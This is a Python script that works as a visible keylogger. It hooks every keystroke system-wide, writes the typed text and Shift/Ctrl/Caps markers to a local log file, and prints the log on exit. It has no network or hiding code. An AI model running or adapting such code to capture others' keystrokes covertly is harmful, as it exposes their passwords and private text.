import keyboard
from click import clear

LOG_FILE = "key_full_log.txt"

with open(LOG_FILE, "w", encoding="utf-8") as f:
    f.write("")
clear()

full_log = ""
caps_lock = False
shift_pressed = False
ctrl_pressed = False

def write_log(content):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(content)
    except:
        pass

def on_key(event):
    global full_log, caps_lock, shift_pressed, ctrl_pressed
    key = event.name
    is_down = (event.event_type == "down")

    if key == "caps lock":
        if is_down:
            caps_lock = not caps_lock
            mark = "  &CAPS_ON  " if caps_lock else "  &CAPS_OFF  "
            full_log += mark
            write_log(mark)
        return

    if key == "shift":
        shift_pressed = is_down
        if is_down:
            mark = "  &SHIFT  "
            full_log += mark
            write_log(mark)
        return

    if key in ["ctrl", "left ctrl", "right ctrl"]:
        ctrl_pressed = is_down
        if is_down:
            mark = "  &CTRL  "
            full_log += mark
            write_log(mark)
        return

    if not is_down:
        return

    if key == "space":
        full_log += " "
        write_log(" ")
        return

    if key == "enter":
        full_log += "\n"
        write_log("\n")
        return

    if key == "backspace":
        full_log = full_log[:-1]
        try:
            with open(LOG_FILE, "r+", encoding="utf-8") as f:
                f.seek(0, 2)
                pos = f.tell() - 1
                if pos >= 0:
                    f.seek(pos)
                    f.truncate()
        except:
            pass
        return

    if len(key) > 1:
        return

    char = key
    if key.isalpha():
        if shift_pressed or caps_lock:
            char = key.upper()
        else:
            char = key.lower()

    full_log += char
    write_log(char)

keyboard.hook(on_key)

print("=" * 60)
print("Keyboard recording started")
print("Press ESC to exit")
print("=" * 60)

keyboard.wait("esc")

print("\nFull Log:")
print(full_log)
print(f"\nLog saved to: {LOG_FILE}")